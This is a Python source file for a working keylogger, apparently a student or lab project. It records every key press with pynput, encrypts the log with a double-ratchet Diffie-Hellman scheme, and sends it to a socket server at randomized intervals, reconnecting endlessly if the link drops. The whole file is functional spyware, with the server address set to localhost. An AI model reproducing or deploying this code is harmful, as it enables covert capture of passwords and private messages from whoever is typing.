#!/usr/bin/env python3
from pynput import keyboard
from threading import Timer
from time import sleep
import socket
import errno
import double_ratchet
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import dh
from cryptography.hazmat.backends import default_backend
from requests import Session
import random
import sys


HEADER_LENGTH = 24
URL = "http://localhost:8080/message.txt"
INTERVAL_SEND = 10
SERVER_IP = "localhost"
SERVER_PORT = 8081


class Keylogger:

    def __init__(self, interval, ip, port, h_length):
        self.interval = interval
        self.ip = ip
        self.port = port
        self.header_lenght = h_length
        self.log = ""
        self.client_socket = None
        self.__r = double_ratchet.Ratchet()
        self.__start_connection()
        self.__s = Session()
        self.__pair_pkey()
        
    def __start_connection(self):
        # starting socket based connection
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket.connect((self.ip, self.port))
        self.client_socket.setblocking(False)
        # send public key to pair the connection
        usr_hlenght = f"{len(self.__r.getPublicKey().decode('utf-8')):<{self.header_lenght}}".encode('utf-8')
        self.client_socket.send(usr_hlenght + self.__r.getPublicKey())

    def __pair_pkey(self):
        # update the public key of the server
        sleep(3)
        r = self.__s.get(URL)
        clavepublica = bytes(r.text, 'ascii')
        dhpublica: dh.DHPublicKey = serialization.load_pem_public_key(clavepublica, backend=default_backend())
        self.__r.pairComm(dhpublica)

    # function to add the pressed keys to the current ones
    def __append_to_log(self, string):
        self.log = self.log + string

    # process the pressed key
    def __process_pressed_key(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.tab:
                current_key = "\t"
            elif key == key.enter:
                current_key = "\n"
            else:
                current_key = "<" + str(key) + ">"
        self.__append_to_log(current_key)

    def __send_2_server(self):
        # if no keys were pressed, do nothing
        if self.log != "":
            message = self.log
            # encrypt the pressed keys
            cifrado = self.__r.encrypt(message)
            message_header = f"{len(cifrado):<{self.header_lenght}}".encode('utf-8')
            msg = message_header + cifrado
            # send the encrypted keys to the server
            self.client_socket.send(msg)
            sleep(3)
            self.__pair_pkey()
            usr_hlenght = f"{len(self.__r.getPublicKey().decode('utf-8')):<{self.header_lenght}}".encode('utf-8')
            self.client_socket.send(usr_hlenght + self.__r.getPublicKey())
        try:
            while True:
                username_header = self.client_socket.recv(self.header_lenght)
                if not len(username_header):
                    raise ConnectionError
                message_header = self.client_socket.recv(self.header_lenght)
                message_length = int(message_header.decode('utf-8').strip())
                message = self.client_socket.recv(message_length).decode('utf-8')
                self.client_socket.close()
        except IOError as e:
            if e.errno != errno.EAGAIN and e.errno != errno.EWOULDBLOCK:
                print(f'Reading error: {str(e)}')
                raise ConnectionError

    # function to send the user input in the given interval
    def __report(self):
        r = random.randint(0, 10)
        self.__send_2_server()
        self.log = ""
        timer = Timer(self.interval+r, self.__report)
        timer.start()
        # cada cierto tiempo hay que actualizar mover el ratchet del servidor!!!

    def start(self):
        # listening 2 the user input
        self.__keyboard_listener = keyboard.Listener(on_press=self.__process_pressed_key)
        with self.__keyboard_listener:
            # starts sending keys to server
            try:
                self.__report()
            except ConnectionError:
                self.__keyboard_listener.join()
            # waiting the listener to finish
            self.__keyboard_listener.join()
    
    def exit(self):
        usr_hlenght = f"{len('close'.encode('utf-8')):<{self.header_lenght}}".encode('utf-8')
        self.client_socket.send(usr_hlenght)
        # close the socket
        self.client_socket.close()
        # exit the program
        self.__keyboard_listener.stop()
        sys.exit()


random.seed(10)
while (True):
    try:
        # adding a print interval of a min of 5 seconds
        keylogger = Keylogger(INTERVAL_SEND, SERVER_IP, SERVER_PORT, HEADER_LENGTH)
        # starting the keyloggger
        keylogger.start()
    except ConnectionError as e:
        print(e)
        sleep(3)
        continue
    except KeyboardInterrupt:
        keylogger.exit()